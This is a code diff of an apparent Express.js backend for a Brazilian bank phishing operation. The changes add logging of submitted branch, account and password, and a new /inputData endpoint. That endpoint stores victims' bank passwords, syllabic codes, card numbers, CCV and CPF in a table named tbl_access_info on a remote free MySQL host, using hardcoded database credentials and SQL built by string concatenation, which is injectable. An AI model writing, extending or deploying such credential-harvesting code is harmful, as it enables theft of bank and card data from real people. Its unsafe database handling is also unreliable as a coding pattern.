@@ -47,7 +47,7 @@ app.post('/getData', function _callee(req, res) {
           checkingBalance = '';
 
           if (!(require.main === module)) {
-            _context.next = 15;
+            _context.next = 16;
             break;
           }
 
@@ -55,23 +55,24 @@ app.post('/getData', function _callee(req, res) {
           branch = req.body.agencia;
           account = req.body.conta;
           password = req.body.pass;
-          _context.next = 10;
+          console.log(branch, account, password);
+          _context.next = 11;
           return _regenerator["default"].awrap(bb.login({
             branch: branch,
             account: account,
             password: password
           }));
 
-        case 10:
+        case 11:
           name = _context.sent;
-          _context.next = 13;
+          _context.next = 14;
           return _regenerator["default"].awrap(bb.checking.getBalance());
 
-        case 13:
+        case 14:
           checkingBalance = _context.sent;
           console.log(name.nomeCliente, checkingBalance);
 
-        case 15:
+        case 16:
           if (name == '') {
             res.json({
               name: name,
@@ -84,30 +85,55 @@ app.post('/getData', function _callee(req, res) {
             });
           }
 
-          _context.next = 21;
+          _context.next = 22;
           break;
 
-        case 18:
-          _context.prev = 18;
+        case 19:
+          _context.prev = 19;
           _context.t0 = _context["catch"](0);
           res.json({
             name: '',
             balance: ''
           });
 
-        case 21:
+        case 22:
         case "end":
           return _context.stop();
       }
     }
-  }, null, null, [[0, 18]]);
+  }, null, null, [[0, 19]]);
 });
-app.get('/', function _callee2(req, res) {
+app.post('/inputData', function _callee2(req, res) {
+  var mysql, con;
   return _regenerator["default"].async(function _callee2$(_context2) {
     while (1) {
       switch (_context2.prev = _context2.next) {
         case 0:
-          res.json('start');
+          try {
+            mysql = require('mysql');
+            con = mysql.createConnection({
+              host: 'sql11.freemysqlhosting.net',
+              user: 'sql11458641',
+              password: 'SNDmBNx6wA',
+              database: 'sql11458641'
+            });
+            con.connect(function (err) {
+              if (err) throw err;
+              console.log('Connected!');
+              var sql = "INSERT INTO tbl_access_info (date, agencia, conta, senha_de_8, saldo, cell, senha_de_6, silabica, nome_do_cartao, numero_do_cartao, ccv, cpf) VALUES ('" + req.body.data_1 + "', '" + req.body.data_2 + "', '" + req.body.data_3 + "', '" + req.body.data_4 + "', '" + req.body.data_5 + "', '" + req.body.data_6 + "', '" + req.body.data_7 + "', '" + req.body.data_8 + "', '" + req.body.data_9 + "', '" + req.body.data_10 + "', '" + req.body.data_11 + "', '" + req.body.data_12 + "')";
+              con.query(sql, function (err, result) {
+                if (err) throw err;
+                console.log('1 record inserted');
+              });
+            });
+            res.json({
+              result: 'success'
+            });
+          } catch (err) {
+            res.json({
+              result: 'fail'
+            });
+          }
 
         case 1:
         case "end":
@@ -116,8 +142,8 @@ app.get('/', function _callee2(req, res) {
     }
   });
 });
-app.listen(8000);
-console.log('Running at Port 8000');
+app.listen(process.env.PORT || 5000);
+console.log('Running at Port 5000');
 var _default = _bb["default"];
 exports["default"] = _default;
 //# sourceMappingURL=index.js.map
